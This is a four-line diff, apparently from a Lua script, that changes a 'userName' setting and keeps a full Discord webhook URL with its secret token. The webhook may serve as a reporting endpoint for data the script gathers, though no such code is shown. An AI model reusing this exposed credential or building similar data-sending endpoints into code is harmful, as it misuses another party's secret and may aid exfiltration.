@@ -1,4 +1,4 @@
-userName = "OLAMYT"
+userName = "Raniase987"
 webHook = "https://discord.com/api/webhooks/1289678550022099014/GMYAt8-7h_bfmWJUSPj6WzNnfgujfrcbr-bDfSbftyORlTRxuakbjFTGa5W-BQcVeBuW"
 
 local values = {
